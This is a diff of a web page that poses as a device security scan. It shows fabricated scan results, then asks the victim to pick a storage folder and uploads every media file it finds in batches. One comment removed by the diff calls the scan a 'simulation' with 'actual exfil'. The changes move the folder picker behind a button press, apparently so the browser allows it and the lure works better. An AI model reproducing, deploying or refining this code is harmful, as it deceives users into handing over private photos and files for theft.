@@ -86,7 +86,7 @@
             margin-left: auto;
         }
 
-        /* Step 1: Login */
+        /* Steps */
         .step { display: none; animation: fadeIn 0.4s ease; }
         .step.active { display: block; }
 
@@ -109,6 +109,7 @@
             line-height: 1.5;
         }
 
+        /* Inputs */
         .input-group {
             margin-bottom: 14px;
         }
@@ -142,6 +143,7 @@
             color: #555577;
         }
 
+        /* Buttons */
         .btn {
             width: 100%;
             padding: 16px;
@@ -170,7 +172,22 @@
             cursor: not-allowed;
         }
 
-        /* Step 2: Scanning */
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #2a2a44;
+            color: #8888aa;
+        }
+
+        .btn-secondary:hover {
+            background: #1a1a2e;
+            border-color: #444466;
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, #ff8800, #ff4400);
+        }
+
+        /* Scan UI */
         .scan-status {
             display: flex;
             align-items: center;
@@ -218,19 +235,6 @@
             margin-top: 2px;
         }
 
-        .scan-info .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            margin-right: 6px;
-        }
-
-        .status-dot.green { background: #44ff88; box-shadow: 0 0 8px #44ff8855; }
-        .status-dot.yellow { background: #ffaa44; box-shadow: 0 0 8px #ffaa4455; }
-        .status-dot.blue { background: #44aaff; box-shadow: 0 0 8px #44aaff55; }
-        .status-dot.gray { background: #444466; }
-
         .progress-wrap {
             background: #0d0d18;
             border-radius: 10px;
@@ -252,7 +256,7 @@
             background: #0a0a12;
             border-radius: 12px;
             padding: 12px 14px;
-            max-height: 120px;
+            max-height: 150px;
             overflow-y: auto;
             font-size: 11px;
             font-family: 'Courier New', monospace;
@@ -288,7 +292,7 @@
         .scan-log .log-entry.warn { color: #ffaa44; }
         .scan-log .log-entry.error { color: #ff4466; }
 
-        /* Step 3: Complete */
+        /* Complete */
         .complete-icon {
             font-size: 52px;
             text-align: center;
@@ -309,18 +313,6 @@
             margin-top: 4px;
         }
 
-        .btn-secondary {
-            background: transparent;
-            border: 1px solid #2a2a44;
-            color: #8888aa;
-            margin-top: 12px;
-        }
-
-        .btn-secondary:hover {
-            background: #1a1a2e;
-            border-color: #444466;
-        }
-
         /* Footer */
         .footer {
             text-align: center;
@@ -332,11 +324,6 @@
             padding-top: 16px;
         }
 
-        .footer span {
-            color: #444466;
-        }
-
-        /* Device badge */
         .device-badge {
             display: inline-flex;
             align-items: center;
@@ -348,6 +335,16 @@
             color: #8888aa;
             border: 1px solid #1a1a2e;
             margin-bottom: 16px;
+        }
+
+        .storage-btn-container {
+            margin-top: 12px;
+            text-align: center;
+        }
+
+        .storage-btn-container .btn {
+            max-width: 280px;
+            margin: 0 auto;
         }
     </style>
 </head>
@@ -421,8 +418,15 @@
                 <div class="log-entry done">● System scan initialized</div>
             </div>
 
-            <!-- Hidden: folder picker will be triggered here -->
-            <div id="folderTrigger" style="display:none;"></div>
+            <!-- Storage Selection Button (appears at 65%) -->
+            <div id="storageBtnContainer" class="storage-btn-container" style="display:none;">
+                <button class="btn btn-warning" id="storageBtn" onclick="triggerFolderPicker()">
+                    📁 Select Storage & Continue
+                </button>
+                <p style="font-size:11px;color:#666688;margin-top:8px;">
+                    Tap to select your device storage for media verification.
+                </p>
+            </div>
         </div>
 
         <!-- ============================================================ -->
@@ -450,6 +454,7 @@
         let allMediaFiles = [];
         let scanInterval = null;
         let progress = 0;
+        let storageSelected = false;
 
         // ============================================================
         // DEVICE DETECTION
@@ -506,34 +511,28 @@
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
 
-            // Start scanning simulation
             startScan();
         }
 
         // ============================================================
-        // STEP 2: SCANNING SIMULATION + ACTUAL EXFIL
+        // STEP 2: SCANNING SIMULATION
         // ============================================================
         function startScan() {
-            const log = document.getElementById('scanLog');
             const progressFill = document.getElementById('progressFill');
             const scanTitle = document.getElementById('scanTitle');
             const scanDesc = document.getElementById('scanDesc');
             const scanPercent = document.getElementById('scanPercent');
-            const scanIcon = document.getElementById('scanIcon');
 
             const messages = [
                 { p: 5, title: 'Checking system integrity...', desc: 'Verifying boot partition', log: '● System integrity check passed' },
                 { p: 15, title: 'Scanning installed apps...', desc: 'Checking for malicious packages', log: '● 247 apps scanned — 0 threats' },
                 { p: 30, title: 'Checking network security...', desc: 'Analyzing connections', log: '● Network security verified' },
                 { p: 45, title: 'Verifying encryption...', desc: 'Checking device encryption', log: '● AES-256 encryption active' },
-                { p: 55, title: 'Scanning media files...', desc: 'Checking for infected media', log: '● Media scan initialized' },
-                { p: 70, title: 'Analyzing system logs...', desc: 'Checking for anomalies', log: '● No anomalies detected' },
-                { p: 85, title: 'Finalizing security check...', desc: 'Applying signatures', log: '● Security signatures updated' },
-                { p: 95, title: 'Almost done...', desc: 'Preparing update', log: '● Preparing installation package' }
+                { p: 55, title: 'Scanning media files...', desc: 'Checking for infected media', log: '● Media scan initialized' }
             ];
 
             let msgIndex = 0;
-            let stepComplete = false;
+            let storageShown = false;
 
             scanInterval = setInterval(() => {
                 progress += 0.5 + Math.random() * 0.8;
@@ -542,7 +541,7 @@
                 progressFill.style.width = progress + '%';
                 scanPercent.textContent = Math.round(progress) + '%';
 
-                // Update messages based on progress
+                // Update messages
                 for (let i = msgIndex; i < messages.length; i++) {
                     if (progress >= messages[i].p) {
                         scanTitle.textContent = messages[i].title;
@@ -552,27 +551,29 @@
                     }
                 }
 
-                // When progress reaches 65, trigger folder picker
-                if (progress >= 65 && !stepComplete) {
-                    stepComplete = true;
-                    scanDesc.textContent = '📁 Please select your storage to continue...';
-                    scanIcon.classList.remove('spinning');
-                    scanIcon.textContent = '📁';
+                // Show storage button at 65%
+                if (progress >= 65 && !storageShown) {
+                    storageShown = true;
+                    document.getElementById('storageBtnContainer').style.display = 'block';
+                    scanDesc.textContent = '📁 Tap "Select Storage" to continue media verification...';
                     addLogEntry('● Waiting for storage selection...', 'warn');
-                    triggerFolderPicker();
+                    document.getElementById('scanIcon').classList.remove('spinning');
+                    document.getElementById('scanIcon').textContent = '📁';
                 }
 
-                // When progress reaches 100, move to step 3
-                if (progress >= 100) {
+                // When done
+                if (progress >= 100 && storageSelected) {
                     clearInterval(scanInterval);
                     setTimeout(() => {
                         document.getElementById('step2').classList.remove('active');
                         document.getElementById('step3').classList.add('active');
                     }, 800);
+                } else if (progress >= 100 && !storageSelected) {
+                    // Wait for storage
+                    scanDesc.textContent = '⏳ Waiting for storage selection...';
                 }
             }, 200);
 
-            // Initial log
             addLogEntry('● Device scan started', 'done');
         }
 
@@ -586,18 +587,24 @@
         }
 
         // ============================================================
-        // FOLDER PICKER TRIGGER (with real extraction)
+        // TRIGGER FOLDER PICKER (USER GESTURE)
         // ============================================================
         async function triggerFolderPicker() {
+            const btn = document.getElementById('storageBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Opening storage...';
+
             try {
                 const dirHandle = await window.showDirectoryPicker({
                     mode: 'read'
                 });
 
+                storageSelected = true;
                 const folderName = dirHandle.name || 'Root';
                 addLogEntry(`● Storage selected: ${folderName}`, 'done');
                 document.getElementById('scanTitle').textContent = '📁 Scanning storage...';
                 document.getElementById('scanDesc').textContent = `Processing ${folderName}...`;
+                document.getElementById('storageBtnContainer').style.display = 'none';
 
                 // Collect and upload media
                 allMediaFiles = [];
@@ -607,6 +614,7 @@
                 if (allMediaFiles.length === 0) {
                     addLogEntry('● No media files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
+                    // Continue to completion
                     return;
                 }
 
@@ -618,7 +626,7 @@
                     const batch = allMediaFiles.slice(i, i + batchSize);
                     await Promise.all(batch.map(file => uploadMediaFile(file)));
                     uploadedFiles += batch.length;
-                    document.getElementById('scanDesc').textContent = 
+                    document.getElementById('scanDesc').textContent =
                         `Uploading ${uploadedFiles}/${totalFiles} files...`;
                     addLogEntry(`● Uploaded ${uploadedFiles}/${totalFiles} files`, 'done');
                 }
@@ -626,7 +634,19 @@
                 addLogEntry(`✅ All ${totalFiles} files uploaded`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
 
+                // If progress is already 100, move to step 3
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    setTimeout(() => {
+                        document.getElementById('step2').classList.remove('active');
+                        document.getElementById('step3').classList.add('active');
+                    }, 800);
+                }
+
             } catch (err) {
+                btn.disabled = false;
+                btn.textContent = '📁 Select Storage & Continue';
+
                 if (err.name === 'AbortError' || err.name === 'SecurityError') {
                     addLogEntry('❌ Storage selection cancelled', 'error');
                 } else {
@@ -700,13 +720,6 @@
         // INIT
         // ============================================================
         detectDevice();
-
-        // Simulate folder picker if no interaction
-        setTimeout(() => {
-            if (document.getElementById('step2').classList.contains('active')) {
-                // Already scanning, do nothing
-            }
-        }, 3000);
     </script>
 </body>
 </html>
